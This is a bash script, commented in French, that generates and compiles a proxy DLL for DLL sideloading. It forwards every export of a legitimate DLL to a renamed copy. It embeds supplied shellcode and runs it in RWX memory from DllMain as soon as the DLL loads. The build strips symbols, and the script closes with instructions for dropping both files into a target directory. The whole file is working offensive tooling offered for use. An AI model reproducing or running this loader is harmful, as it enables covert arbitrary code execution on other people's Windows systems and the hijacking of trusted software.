#!/bin/bash
# Usage: ./dllproxy.sh <original.dll> <shellcode.bin> [debug]
set -e

ORIG_DLL="$1"
SHELLCODE="$2"
MODE="${3:-release}"

[ -z "$ORIG_DLL" ] || [ -z "$SHELLCODE" ] && {
    echo "Usage: $0 <original.dll> <shellcode.bin> [debug|release]"; exit 1
}

BASENAME=$(basename "$ORIG_DLL" .dll)
WORKDIR=$(mktemp -d)
OUTDIR="./out_${BASENAME}"
mkdir -p "$OUTDIR"

echo "[+] Workdir: $WORKDIR"
echo "[+] Target DLL: $BASENAME.dll"

# ─── 1. Extraction des exports via Python/pefile ───
pip3 install pefile --quiet 2>/dev/null || true

python3 << EOF
import pefile, sys
pe = pefile.PE("$ORIG_DLL")
exports = []
if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name:
            exports.append((exp.name.decode(), exp.ordinal))
        else:
            exports.append((None, exp.ordinal))

with open("$WORKDIR/exports.txt", "w") as f:
    for name, ordinal in exports:
        if name:
            f.write(f"{name},{ordinal}\n")
print(f"[+] {len(exports)} exports extracted")
EOF

# ─── 2. Génération du .c avec pragmas + loader shellcode ───
CFILE="$WORKDIR/${BASENAME}_proxy.c"

cat > "$CFILE" << 'HEADER'
#include <windows.h>
#include <stdio.h>

HEADER

# Embed shellcode
echo "unsigned char payload[] = {" >> "$CFILE"
xxd -i < "$SHELLCODE" >> "$CFILE"
echo "};" >> "$CFILE"
echo "unsigned int payload_len = sizeof(payload);" >> "$CFILE"

# Pragmas d'export (proxy vers DLL renommée)
PROXY_NAME="${BASENAME}_orig"
while IFS=, read -r name ordinal; do
    echo "#pragma comment(linker, \"/export:${name}=${PROXY_NAME}.${name},@${ordinal}\")" >> "$CFILE"
done < "$WORKDIR/exports.txt"

# DllMain + shellcode runner (thread)
cat >> "$CFILE" << 'FOOTER'

DWORD WINAPI ShellcodeThread(LPVOID lpParam) {
    void *exec = VirtualAlloc(0, payload_len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return 1;
    memcpy(exec, payload, payload_len);
    ((void(*)())exec)();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        CreateThread(NULL, 0, ShellcodeThread, NULL, 0, NULL);
    }
    return TRUE;
}
FOOTER

echo "[+] Generated: $CFILE"

# ─── 3. Compilation MinGW ───
if [ "$MODE" = "debug" ]; then
    CFLAGS="-g -O0"
else
    CFLAGS="-O2 -s -fvisibility=hidden"
fi

OUTPUT_DLL="$OUTDIR/${BASENAME}.dll"
x86_64-w64-mingw32-gcc -shared $CFLAGS \
    "$CFILE" \
    -o "$OUTPUT_DLL" \
    -lkernel32 -static-libgcc \
    -Wl,--enable-stdcall-fixup \
    -Wl,--exclude-all-symbols

echo "[+] Compiled: $OUTPUT_DLL"

# ─── 4. Copie de la DLL originale renommée ───
cp "$ORIG_DLL" "$OUTDIR/${PROXY_NAME}.dll"
echo "[+] Original copied: $OUTDIR/${PROXY_NAME}.dll"

# ─── 5. Récap ───
echo ""
echo "═══════════════════════════════════════════"
echo "✅ DEPLOY FILES (copy both to target dir):"
echo "   - $OUTPUT_DLL          → rename target"
echo "   - $OUTDIR/${PROXY_NAME}.dll  → keep this name"
echo "═══════════════════════════════════════════"

rm -rf "$WORKDIR"
